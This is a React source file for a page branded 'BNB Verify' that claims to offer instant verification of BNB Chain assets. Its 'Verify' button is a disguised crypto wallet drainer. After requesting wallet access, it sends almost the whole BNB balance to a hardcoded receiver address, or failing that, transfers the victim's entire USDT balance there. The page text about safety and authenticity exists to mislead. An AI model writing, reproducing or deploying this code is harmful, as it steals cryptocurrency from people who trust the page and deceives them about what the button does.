import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css"; // We'll create this for Tailwind + custom styles

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Please install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="App bg-gradient-to-b from-black via-gray-900 to-gray-800 min-h-screen flex flex-col items-center">
      {/* Navbar */}
      <header className="w-full bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
            <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
          </div>
          <div className="hidden md:flex space-x-8 text-sm font-medium">
            {["Home", "Explorer", "Tokens", "NFTs", "DApps"].map((item) => (
              <a key={item} href="#" className="hover:text-yellow-400 transition-colors">{item}</a>
            ))}
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="flex flex-col items-center justify-center text-center px-6 py-12 container">
        <div className="inline-block bg-[#1E1E1E] text-yellow-400 font-semibold px-4 py-1 rounded-full mb-4 text-sm">
          Powered by BNB Chain
        </div>
        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">
          Verify Crypto Assets
        </h1>
        <p className="text-gray-300 mb-8 max-w-xl">
          Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20).
        </p>

        <div className="relative w-40 h-40 mb-4">
          <div className="pulse-ring absolute inset-0"></div>
          <div className="pulse-ring absolute inset-0" style={{ animationDelay: "0.8s" }}></div>
          <div className="pulse-ring absolute inset-0" style={{ animationDelay: "1.6s" }}></div>
          <button
            className="center-button"
            onClick={handleVerify}
          >
            Verify
          </button>
        </div>
        <p id="status" className="text-gray-300 text-lg">{status}</p>
      </main>

      {/* Cards Section */}
      <section className="container mx-auto px-6 py-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
        {[
          { title: "Explorer", desc: "Browse addresses, contracts, tokens, and transactions." },
          { title: "Tokens", desc: "Check token balances and authenticity." },
          { title: "NFTs", desc: "Verify NFTs and view metadata securely." },
          { title: "DApps", desc: "Connect to decentralized apps safely." }
        ].map((card) => (
          <div key={card.title} className="card bg-[#1E1E1E] rounded-xl p-6 text-center transition-all cursor-pointer hover:translate-y-[-5px] hover:shadow-[0_10px_20px_rgba(250,204,21,0.3)]">
            <h2 className="text-yellow-400 text-lg font-semibold mb-2">{card.title}</h2>
            <p className="text-gray-400 text-sm">{card.desc}</p>
          </div>
        ))}
      </section>

      {/* Footer */}
      <footer className="bg-[#171717] mt-auto py-6 text-center text-gray-500 text-sm w-full">
        &copy; 2025 BNB Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}

export default App;
